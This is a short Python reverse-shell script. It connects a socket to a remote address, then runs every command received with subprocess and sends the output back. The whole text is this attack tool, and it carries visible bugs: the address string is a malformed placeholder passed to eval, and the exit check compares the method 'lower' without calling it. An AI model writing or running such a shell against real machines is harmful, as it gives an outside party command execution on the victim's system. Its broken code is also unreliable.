import socket
import subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = """tuple(str(ipv4_address), int(port)"""

s.connect(eval(ip))
while True:
    command = s.recv(1024).decode()
    if command.lower == 'exit':
        break
    output = subprocess.getoutput(command)
    s.send(output.encode())
s.close()